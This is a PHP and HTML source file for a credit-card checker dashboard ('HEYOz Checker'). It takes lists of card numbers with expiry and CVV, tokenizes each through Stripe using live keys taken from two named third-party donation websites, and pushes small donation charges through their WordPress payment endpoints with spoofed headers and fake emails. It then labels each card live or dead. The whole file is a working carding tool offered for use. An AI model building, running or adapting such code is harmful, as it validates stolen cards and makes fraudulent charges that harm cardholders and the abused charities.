<?php
// --- Server-Side Logic (Logic ပိုင်းကို မူရင်းအတိုင်း ထားရှိပါသည်) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header("Content-Type: application/json");
    $data = json_decode(file_get_contents('php://input'), true);
    
    $ccx = $data['card'] ?? "";
    $gate = $data['gate'] ?? "gate1"; 

    if (empty($ccx)) { echo json_encode(["status" => "DEAD", "msg" => "No Card Data"]); exit; }
    
    if (preg_match('/(\d{15,16})[\s|:|\\/]+(\d{1,2})[\s|:|\\/]+(\d{2,4})[\s|:|\\/]+(\d{3,4})/', $ccx, $matches)) {
        $cc = $matches[1]; $mes = $matches[2]; $ano = $matches[3]; $cvv = $matches[4];
    } else {
        preg_match_all("/(\d+)/", $ccx, $list);
        if (count($list[0]) < 4) { echo json_encode(["status" => "DEAD", "msg" => "Invalid Format"]); exit; }
        $cc = $list[0][0]; $mes = $list[0][1]; $ano = $list[0][2]; $cvv = $list[0][3];
    }
    if (strlen($mes) == 1) $mes = "0" . $mes;
    if (strlen($ano) == 4) $ano = substr($ano, 2);

    $bin = substr($cc, 0, 6);
    $ch_bin = curl_init("https://lookup.binlist.net/" . $bin);
    curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_bin, CURLOPT_HTTPHEADER, ['Accept-Version: 3']);
    curl_setopt($ch_bin, CURLOPT_TIMEOUT, 3);
    $bin_res = json_decode(curl_exec($ch_bin), true);
    curl_close($ch_bin);
    if ($bin_res && isset($bin_res['scheme'])) {
        $brand = strtoupper($bin_res['scheme'] ?? 'UNK');
        $bank = $bin_res['bank']['name'] ?? 'Unknown Bank';
        $country = $bin_res['country']['emoji'] ?? '🏳️';
        $bin_info = "[$brand - $bank $country]";
    } else {
        $f = substr($cc, 0, 1);
        $fallback_brand = ($f == '4') ? "VISA" : (($f == '5') ? "MASTER" : "UNK");
        $bin_info = "[$fallback_brand - BIN LIMIT]";
    }

    $email = 'jhsha' . rand(100, 999) . '@gmail.com';
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    if ($gate == "gate1") {
        $pk = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d';
        $site_origin = 'https://texassouthernacademy.com';
    } else {
        $pk = 'pk_live_51MrJUoFYWOfRAL36tEpAYV8qK1PEbiqp3QXs3wjZTLCImyIh2mmkYi8nW2tZBVvfgZG7UVaurtWfwkigqQAD6KJg00VB6fcBoS';
        $site_origin = 'https://christiantvireland.ie';
    }

    $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, [
        'authority: api.stripe.com', 'accept: application/json', 'content-type: application/x-www-form-urlencoded',
        'origin: ' . $site_origin, 'referer: https://js.stripe.com/', 'user-agent: ' . $ua
    ]);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card', 'billing_details[name]' => 'John Steve', 'card[number]' => $cc,
        'card[cvc]' => trim($cvv), 'card[exp_month]' => $mes, 'card[exp_year]' => $ano, 'key' => $pk,
        'payment_user_agent' => 'stripe.js/a3e7d2f3d5; stripe-js-v3/a3e7d2f3d5; card-element'
    ]));
    $res1 = json_decode(curl_exec($ch1), true);
    $pm = $res1['id'] ?? null;

    if (!$pm) {
        $err = $res1['error']['message'] ?? "Tokenization Restricted";
        echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit;
    }

    if ($gate == "gate1") {
        $target = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php';
        $fields = [
            'action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'donate',
            'wpfs-card-holder-email' => $email, 'wpfs-stripe-payment-method-id' => $pm,
        ];
    } else {
        $target = 'https://christiantvireland.ie/wp-admin/admin-ajax.php';
        $fields = [
            'action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'website_donation',
            'wpfs-card-holder-email' => $email, 'wpfs-stripe-payment-method-id' => $pm
        ];
    }

    $ch2 = curl_init($target);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, ['origin: ' . $site_origin, 'referer: ' . $site_origin, 'user-agent: ' . $ua]);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
    $res2 = json_decode(curl_exec($ch2), true);
    $msg = $res2['message'] ?? "No Response";

    if (stripos($msg, "Successful") !== false || stripos($msg, "thank you") !== false) { $st = "LIVE"; $m = "CHARGED 🔥"; }
    elseif (stripos($msg, "insufficient") !== false) { $st = "INSUF"; $m = "LOW FUNDS 💰"; }
    elseif (stripos($msg, "action") !== false || stripos($msg, "authentication") !== false) { $st = "CVV"; $m = "3Ds/CCN 🛡️"; }
    else { $st = "DEAD"; $m = $msg; }
    
    echo json_encode(["status" => $st, "msg" => "$m $bin_info ( HEYOz🔥 )"]); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ 𝐇𝐄𝐘𝐎𝐳 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 DASHBOARD ⚡</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; padding: 15px; margin: 0; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 900px; animation: fadeIn 0.8s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .header-box { display: flex; justify-content: center; align-items: center; background: linear-gradient(90deg, #161b22, #0d1117); padding: 20px; border-radius: 15px; border: 1px solid var(--border); margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        h1 { font-size: 1.6rem; color: var(--accent); margin: 0; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px rgba(88, 166, 255, 0.3); }
        
        #status-display { background: #010409; border: 1px solid var(--accent); padding: 15px; border-radius: 12px; text-align: center; margin-bottom: 20px; font-family: monospace; color: var(--accent); font-weight: bold; min-height: 45px; box-shadow: inset 0 0 15px rgba(88, 166, 255, 0.1); }
        
        .gate-select { width: 100%; background: var(--card); color: var(--accent); border: 1px solid var(--border); padding: 12px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; outline: none; cursor: pointer; transition: 0.3s; }
        .gate-select:focus { border-color: var(--accent); }
        
        .input-group { position: relative; width: 100%; }
        textarea { width: 100%; height: 160px; background: #010409; color: var(--accent); border: 1px solid var(--border); padding: 15px; border-radius: 12px; font-family: monospace; resize: none; outline: none; transition: 0.3s; }
        textarea:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(88, 166, 255, 0.05); }
        .upload-label { position: absolute; top: 12px; right: 12px; background: #30363d; color: #c9d1d9; border: 1px solid var(--border); padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.3s; }
        .upload-label:hover { background: var(--accent); color: #fff; }
        
        .controls { display: flex; gap: 12px; margin: 20px 0; }
        #btn { flex: 2; background: linear-gradient(45deg, #238636, #2ea043); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; box-shadow: 0 10px 20px rgba(35, 134, 54, 0.2); }
        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; display: none; transition: 0.3s; }
        #btn:hover { transform: translateY(-2px); box-shadow: 0 15px 25px rgba(35, 134, 54, 0.3); }

        .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-box { background: var(--card); border: 1px solid var(--border); padding: 12px; border-radius: 15px; text-align: center; transition: 0.3s; border-bottom: 3px solid transparent; }
        .stat-box:hover { border-color: var(--accent); background: #1c2128; }
        .stat-box small { font-size: 10px; color: #8b949e; text-transform: uppercase; display: block; margin-bottom: 5px; }
        .stat-box span { font-size: 20px; font-weight: bold; display: block; }
        .stat-box.hit { border-bottom-color: #3fb950; }
        .stat-box.dead { border-bottom-color: #f85149; }

        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 15px; margin-bottom: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .res-head { padding: 14px 18px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.02); transition: 0.3s; }
        .res-head:hover { background: rgba(255,255,255,0.05); }
        .res-body { display: none; padding: 10px; font-family: monospace; font-size: 12px; border-top: 1px solid var(--border); background: #0d1117; max-height: 250px; overflow-y: auto; }
        
        .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header-box">
        <h1><i class="fa-solid fa-fire-glow"></i> 𝐇𝐄𝐘𝐎𝐳 𝐂𝐡𝐞𝐜𝐤𝐞𝐫</h1>
    </div>
    
    <div id="status-display"><i class="fa-solid fa-satellite-dish"></i> SYSTEM READY</div>

    <select id="gate" class="gate-select">
        <option value="gate1">⚡ GATE 1: STRIPE $1.00 (Charge)</option>
        <option value="gate2">⚡ GATE 2: STRIPE $0.50 (Auth)</option>
    </select>

    <div class="input-group">
        <textarea id="list" placeholder="Paste cards here... (Format: CC|MM|YY|CVV)"></textarea>
        <label for="fileInput" class="upload-label"><i class="fa-solid fa-file-import"></i> IMPORT</label>
        <input type="file" id="fileInput" accept=".txt" style="display: none;" onchange="handleFileUpload()">
    </div>
    
    <div class="controls">
        <button id="btn" onclick="start()"><i class="fa-solid fa-play"></i> START SCANNING</button>
        <button id="stopBtn" onclick="stop()"><i class="fa-solid fa-stop"></i> STOP</button>
    </div>

    <div class="stats">
        <div class="stat-box"><small>Total</small><span id="c_total">0</span></div>
        <div class="stat-box hit"><small class="LIVE">Hit</small><span id="c_live" class="LIVE">0</span></div>
        <div class="stat-box"><small class="INSUF">Insuf</small><span id="c_insuf" class="INSUF">0</span></div>
        <div class="stat-box"><small class="CVV">3Ds</small><span id="c_cvv" class="CVV">0</span></div>
        <div class="stat-box dead"><small class="DEAD">Dead</small><span id="c_dead" class="DEAD">0</span></div>
    </div>

    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live')"><span><i class="fa-solid fa-circle-check"></i> HIT / CHARGED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_live"></div></div>
    <div class="result-box"><div class="res-head" style="color:#f85149" onclick="toggleBox('l_dead')"><span><i class="fa-solid fa-circle-xmark"></i> DECLINED</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_dead"></div></div>
</div>

<script>
    let counts = { LIVE: 0, INSUF: 0, CVV: 0, DEAD: 0 };
    let isRunning = false;

    function handleFileUpload() {
        const fileInput = document.getElementById('fileInput');
        const textArea = document.getElementById('list');
        const file = fileInput.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const lines = e.target.result.split('\n').filter(line => line.trim() !== "");
                textArea.value = lines.join('\n');
                updateTotal();
            };
            reader.readAsText(file);
        }
    }

    function updateTotal() {
        const lines = document.getElementById('list').value.split('\n').filter(l => l.trim() !== "");
        document.getElementById('c_total').innerText = lines.length;
    }

    function toggleBox(id) {
        const body = document.getElementById(id);
        body.style.display = body.style.display === "block" ? "none" : "block";
    }

    function stop() { isRunning = false; document.getElementById('stopBtn').style.display = 'none'; document.getElementById('btn').disabled = false; }

    async function start() {
        const textArea = document.getElementById('list');
        const statusBox = document.getElementById('status-display');
        let lines = textArea.value.split('\n').filter(l => l.trim() !== "");
        if (lines.length === 0) return;
        updateTotal();

        isRunning = true;
        document.getElementById('btn').disabled = true;
        document.getElementById('stopBtn').style.display = 'block';

        while (lines.length > 0 && isRunning) {
            let line = lines[0].trim();
            statusBox.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Checking: ' + line;
            const startTime = performance.now();

            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    body: JSON.stringify({ card: line, gate: document.getElementById('gate').value }),
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                const timeTaken = ((performance.now() - startTime) / 1000).toFixed(2);

                counts[data.status]++;
                if(document.getElementById('c_' + data.status.toLowerCase())) {
                    document.getElementById('c_' + data.status.toLowerCase()).innerText = counts[data.status];
                }

                const targetId = (data.status === "LIVE" || data.status === "INSUF" || data.status === "CVV") ? 'l_live' : 'l_dead';
                const target = document.getElementById(targetId);
                const item = document.createElement('div');
                item.style.padding = "8px 0"; item.style.borderBottom = "1px solid #21262d";
                item.innerHTML = `<span class="${data.status}">[${data.status}]</span> ${line} -> <span class="${data.status}">${data.msg}</span> <span style="font-size:10px; color:#8b949e;">[${timeTaken}s]</span>`;
                target.insertBefore(item, target.firstChild);

                lines.shift();
                textArea.value = lines.join('\n');
                updateTotal();
                await new Promise(r => setTimeout(r, 600)); 
            } catch (e) { isRunning = false; }
        }
        stop();
        statusBox.innerHTML = '<i class="fa-solid fa-circle-check"></i> CHECKING FINISHED.';
    }
</script>
</body>
</html>
